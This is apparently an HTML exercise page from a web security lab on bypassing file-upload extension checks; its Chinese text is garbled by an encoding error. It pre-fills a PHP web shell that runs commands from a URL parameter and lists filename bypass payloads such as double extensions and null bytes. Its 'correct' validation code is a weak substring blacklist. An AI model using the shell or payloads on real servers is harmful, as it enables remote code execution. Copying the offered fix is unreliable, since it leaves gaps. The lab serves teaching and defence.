<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>åç¼€åç»•è¿‡ - æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
  <link rel="stylesheet" href="../xss/style.css">
  <style>
    .upload-box { border: 2px dashed #ddd; padding: 20px; border-radius: 8px; margin: 15px 0; }
    .payload-btn { background: #263238; color: #fff; border: none; padding: 8px 12px; margin: 5px; border-radius: 4px; cursor: pointer; font-size: 12px; }
    .payload-btn:hover { background: #37474f; }
    .result-box { background: #f5f5f5; padding: 15px; border-radius: 8px; margin-top: 15px; min-height: 80px; }
    .success { color: #4caf50; }
    .error { color: #f44336; }
  </style>
</head>
<body>
  <div class="container">
    <a href="index.html" class="back-link">â† è¿”å›æ–‡ä»¶ä¸Šä¼ æ¼æ´</a>
    <h1>ğŸ“ å®éªŒä¸€ï¼šåç¼€åç»•è¿‡</h1>

    <div class="warning-box">
      <strong>âš ï¸ æ¼æ´åœºæ™¯</strong>
      <p>æœåŠ¡å™¨åªæ£€æŸ¥æ–‡ä»¶æ‰©å±•åï¼Œå¯é€šè¿‡å¤šç§æ–¹å¼ç»•è¿‡</p>
    </div>

    <section>
      <h2>ğŸ® æ”»å‡»æ¼”ç¤º</h2>
      
      <div class="upload-box">
        <h3>æ¨¡æ‹Ÿä¸Šä¼ </h3>
        <div>
          <label>æ–‡ä»¶å:</label>
          <input type="text" id="filename" value="avatar.jpg" style="width: 300px; padding: 8px; margin: 5px;">
        </div>
        <div>
          <label>MIME:</label>
          <input type="text" id="mime" value="image/jpeg" style="width: 300px; padding: 8px; margin: 5px;">
        </div>
        <div>
          <label>å†…å®¹:</label>
          <textarea id="content" style="width: 300px; height: 60px; padding: 8px; margin: 5px;">&lt;?php system($_GET['cmd']); ?&gt;</textarea>
        </div>
        <button onclick="upload()" class="btn">ä¸Šä¼ åˆ°ä¸å®‰å…¨æ¥å£</button>
      </div>

      <h3>ğŸ¯ å¸¸ç”¨ç»•è¿‡ Payload</h3>
      <div>
        <button class="payload-btn" onclick="setPayload('shell.php.jpg', 'image/jpeg')">åŒæ‰©å±•å: shell.php.jpg</button>
        <button class="payload-btn" onclick="setPayload('shell.PhP', 'application/x-php')">å¤§å°å†™: shell.PhP</button>
        <button class="payload-btn" onclick="setPayload('shell.php%00.jpg', 'image/jpeg')">ç©ºå­—èŠ‚: shell.php%00.jpg</button>
        <button class="payload-btn" onclick="setPayload('shell.phtml', 'text/html')">æ›¿ä»£æ‰©å±•: shell.phtml</button>
        <button class="payload-btn" onclick="setPayload('shell.php5', 'application/x-php')">ç‰ˆæœ¬æ‰©å±•: shell.php5</button>
        <button class="payload-btn" onclick="setPayload('shell.jpg.php', 'image/jpeg')">åå‘åŒæ‰©å±•: shell.jpg.php</button>
      </div>

      <div class="result-box" id="result">ç‚¹å‡»ä¸Šä¼ æŸ¥çœ‹ç»“æœ...</div>
    </section>

    <section>
      <h2>ğŸ’€ æ¼æ´ä»£ç </h2>
      <pre><code>// âŒ åªæ£€æŸ¥æœ€åçš„æ‰©å±•å
const ext = filename.substring(filename.lastIndexOf('.'))

if (!ALLOWED_EXTENSIONS.includes(ext.toLowerCase())) {
  return res.status(400).json({ error: 'ä¸å…è®¸çš„æ–‡ä»¶ç±»å‹' })
}

// é—®é¢˜ï¼šshell.php.jpg çš„ ext æ˜¯ .jpgï¼Œé€šè¿‡æ£€æŸ¥ï¼</code></pre>
    </section>

    <section>
      <h2>ğŸ›¡ï¸ æ­£ç¡®åšæ³•</h2>
      <pre><code>// âœ… æ£€æŸ¥æ‰€æœ‰æ‰©å±•å
const parts = filename.split('.')
const dangerousExts = ['.php', '.jsp', '.asp', '.exe']

for (const part of parts) {
  if (dangerousExts.some(e => e.includes(part.toLowerCase()))) {
    return res.status(400).json({ error: 'æ£€æµ‹åˆ°å±é™©æ‰©å±•å' })
  }
}</code></pre>
    </section>
  </div>

  <script>
    function setPayload(filename, mime) {
      document.getElementById('filename').value = filename
      document.getElementById('mime').value = mime
    }
    
    async function upload() {
      const filename = document.getElementById('filename').value
      const mime = document.getElementById('mime').value
      const content = document.getElementById('content').value
      
      const res = await fetch('/api/fileupload/unsafe/extension', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ filename, mime, content })
      })
      const data = await res.json()
      
      const isSuccess = data.success
      document.getElementById('result').innerHTML = `
        <span class="${isSuccess ? 'success' : 'error'}">${isSuccess ? 'âœ… ä¸Šä¼ æˆåŠŸï¼ˆç»•è¿‡æ£€æŸ¥ï¼‰' : 'âŒ ä¸Šä¼ å¤±è´¥'}</span>
        <pre>${JSON.stringify(data, null, 2)}</pre>
      `
    }
  </script>
</body>
</html>
